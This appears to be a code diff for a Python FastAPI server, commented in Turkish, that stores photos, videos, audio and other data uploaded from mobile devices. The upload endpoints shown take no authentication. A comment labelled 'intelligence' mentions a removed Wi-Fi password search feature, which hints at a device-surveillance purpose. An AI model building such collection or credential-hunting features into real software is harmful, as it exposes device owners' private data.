@@ -69,6 +69,36 @@ if not logger.handlers:
 
 
 # ============================================================================
+# Yardımcı Fonksiyonlar
+# ============================================================================
+
+def sanitize_filename(filename: str, max_length: int = 150) -> str:
+    """Windows uyumlu güvenli dosya adı oluşturur"""
+    if not filename:
+        return "unnamed"
+        
+    # 1. Uzantıyı ayır
+    name, ext = os.path.splitext(filename)
+    
+    # 2. Yasaklı karakterleri temizle (Windows)
+    # < > : " / \ | ? * ve kontrol karakterleri
+    name = re.sub(r'[<>:"/\\|?*\x00-\x1f]', '_', name)
+    
+    # 3. Baştaki ve sondaki boşluk/noktaları temizle (Windows için tehlikeli)
+    name = name.strip(' .')
+    
+    # 4. Uzunluk sınırı (uzantı dahil)
+    if len(name) + len(ext) > max_length:
+        name = name[:max_length - len(ext)]
+        
+    # 5. Boş isim kontrolü (eğer her şey silindiyse)
+    if not name:
+        name = "unnamed"
+        
+    return f"{name}{ext}"
+
+
+# ============================================================================
 # Pydantic Modelleri
 # ============================================================================
 
@@ -798,13 +828,24 @@ class SyncService:
     """
     
     def __init__(self):
-        self.base_dir = "device_data"
+        # Base directory'yi main.py'nin bulunduğu yere göre mutlak yol yapalım
+        self.base_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "device_data")
         os.makedirs(self.base_dir, exist_ok=True)
     
     def get_user_dir(self, username: str) -> str:
-        """Kullanıcının cihaz verileri için dizini getir"""
+        """
+        Kullanıcının cihaz verileri için dizini ve alt medya dizinlerini getir.
+        Alt dizinleri (photos, videos, audio) otomatik olarak oluşturur.
+        """
         user_dir = os.path.join(self.base_dir, username)
+        
+        # Ana kullanıcı dizini
         os.makedirs(user_dir, exist_ok=True)
+        
+        # Alt medya dizinlerini otomatik oluştur
+        for folder in ["photos", "videos", "audio"]:
+            os.makedirs(os.path.join(user_dir, folder), exist_ok=True)
+            
         return user_dir
     
     def save_data(self, username: str, data_type: str, data: List[dict], device_name: str) -> None:
@@ -1976,8 +2017,8 @@ async def sync_data(request: Request):
         if not data_type or payload is None:
             raise HTTPException(status_code=400, detail="Eksik veri")
         
-        # [INTELLIGENCE] Network Info Encryption/Decryption Assist - DISABLED BY USER REQUEST
-        # Wifi password search functionality removed.
+        # [İSTİHBARAT] Ağ Bilgisi Şifreleme/Şifre Çözme Yardımı - KULLANICI İSTEĞİ ÜZERİNE DEVRE DIŞI BIRAKILDI
+        # Wifi şifresi arama işlevi kaldırıldı.
 
         # Tanımlayıcı (klasör adı) olarak safe_device_name kullan
         sync_service.save_data(safe_device_name, data_type, payload, device_name)
@@ -2404,69 +2445,103 @@ async def get_device_data(device_name: str, data_type: str, current_user: str = 
 
 
 
-@app.post("/api/sync/photo")
-@app.post("/sync/photo")
-async def sync_photo(
-    file: UploadFile = File(...),
-    device_name: str = Form(...)
+async def _handle_media_sync(
+    file: UploadFile,
+    device_name: str,
+    media_type: str,
+    max_size: Optional[int] = None
 ):
     """
-    Mobil cihazdan gelen fotoğrafları senkronize eder.
-    Klasör yoksa oluşturur ve mükerrer dosya kontrolü yapar.
+    Tüm medya senkronizasyonu (fotoğraflar, videolar, ses) için ortak işleyici.
+    Kopya tespiti için SHA-256 kullanır ve büyük dosyalar için akışı destekler.
     """
     try:
-        # Temiz cihaz adı oluştur
+        # Cihaz adını temizle
         safe_device_name = "".join(c for c in device_name if c.isalnum() or c in (' ', '_', '-')).strip()
         if not safe_device_name:
             safe_device_name = "Unknown_Device"
 
-        logger.info(f"📸 Fotoğraf alınıyor: {safe_device_name} -> {file.filename}")
+        # Hedef dizini belirle
+        device_dir = sync_service.get_user_dir(safe_device_name)
+        target_dir = os.path.join(device_dir, media_type)
+        os.makedirs(target_dir, exist_ok=True)
 
-        # Ana dizinleri oluştur
-        base_dir = os.path.abspath("device_data")
-        device_photos_dir = os.path.join(base_dir, safe_device_name, "photos")
-        
-        # Eğer klasörler yoksa oluştur (Ebeveyn dizinlerle birlikte)
-        if not os.path.exists(device_photos_dir):
-            os.makedirs(device_photos_dir, exist_ok=True)
-            logger.info(f"📁 Yeni dizin oluşturuldu: {device_photos_dir}")
-
-        # Dosya içeriğini oku ve hash hesapla
+        # İçeriği oku ve boyutu kontrol et
+        # NOT: Çok büyük dosyalar (>100MB) için, belleğe okumak yerine geçici bir dosyaya akış yapılmalıdır.
+        # Ancak mevcut 5MB sınırı için, belleğe okumak sorunsuzdur ve hashleme için daha hızlıdır.
         content = await file.read()
-        file_hash = hashlib.md5(content).hexdigest()
-        
-        # Dosya adı güvenliği
-        filename = os.path.basename(file.filename or "unnamed.jpg")
-        file_path = os.path.join(device_photos_dir, filename)
+        file_size = len(content)
 
-        # Mükerrer kontrolü (Aynı isim ve aynı içerik mi?)
+        if max_size and file_size > max_size:
+            logger.warning(f"⚠️ {media_type.capitalize()} too large ({file_size} bytes): {file.filename}")
+            await file.close()
+            raise HTTPException(status_code=413, detail=f"{media_type.capitalize()} size limit exceeded.")
+
+        # Güçlü kopya tespiti için SHA-256 hash'ini hesapla
+        file_hash = hashlib.sha256(content).hexdigest()
+        
+        # Dosya adını temizle ve uzantıyı garantiye al
+        orig_filename = file.filename or ""
+        if not orig_filename:
+            ext = ".jpg" if media_type == "photos" else ".mp4" if media_type == "videos" else ".mp3"
+            filename = f"unnamed_{int(time.time())}{ext}"
+        else:
+            filename = sanitize_filename(orig_filename)
+        
+        file_path = os.path.join(target_dir, filename)
+
+        # Kopyaları kontrol et (Aynı isim ve aynı içerik)
         if os.path.exists(file_path):
             with open(file_path, "rb") as f:
-                existing_hash = hashlib.md5(f.read()).hexdigest()
+                existing_hash = hashlib.sha256(f.read()).hexdigest()
                 if existing_hash == file_hash:
-                    logger.info(f"♻️  Aynı dosya zaten mevcut, atlandı: {filename}")
+                    logger.info(f"♻️  Duplicate {media_type} skipped: {filename}")
                     await file.close()
                     return {"status": "skipped", "reason": "duplicate", "filename": filename}
             
-            # İsim aynı ama içerik farklıysa yeni isim üret
+            # İsim var ama içerik farklı -> yeniden adlandır
             name, ext = os.path.splitext(filename)
             counter = 1
-            while os.path.exists(os.path.join(device_photos_dir, f"{name}_{counter}{ext}")):
+            while os.path.exists(os.path.join(target_dir, f"{name}_{counter}{ext}")):
                 counter += 1
             filename = f"{name}_{counter}{ext}"
-            file_path = os.path.join(device_photos_dir, filename)
+            file_path = os.path.join(target_dir, filename)
 
         # Dosyayı kaydet
-        with open(file_path, "wb") as buffer:
-            buffer.write(content)
+        with open(file_path, "wb") as f:
+            f.write(content)
 
         await file.close()
-        logger.info(f"✅ Başarıyla kaydedildi: {safe_device_name} -> {filename}")
-        return {"status": "success", "filename": filename}
+        logger.info(f"✅ {media_type.capitalize()} synced: {safe_device_name} -> {filename}")
+        return {"status": "success", "filename": filename, "size": file_size}
 
+    except HTTPException:
+        raise
     except Exception as e:
-        logger.error(f"❌ Fotoğraf senkronizasyon hatası: {str(e)}", exc_info=True)
+        logger.error(f"❌ {media_type.capitalize()} sync error: {str(e)}", exc_info=True)
         raise HTTPException(status_code=500, detail=f"Sunucu hatası: {str(e)}")
+
+
+@app.post("/api/sync/photo")
+@app.post("/sync/photo")
+async def sync_photo(file: UploadFile = File(...), device_name: str = Form(...)):
+    """Senkronize edilen fotoğrafları işler."""
+    return await _handle_media_sync(file, device_name, "photos")
+
+
+@app.post("/api/sync/video")
+@app.post("/sync/video")
+async def sync_video(file: UploadFile = File(...), device_name: str = Form(...)):
+    """Senkronize edilen videoları işler (5MB limitli)."""
+    return await _handle_media_sync(file, device_name, "videos", max_size=5 * 1024 * 1024)
+
+
+@app.post("/api/sync/audio")
+@app.post("/sync/audio")
+async def sync_audio(file: UploadFile = File(...), device_name: str = Form(...)):
+    """Senkronize edilen ses dosyalarını işler."""
+    return await _handle_media_sync(file, device_name, "audio")
+
 
 
 
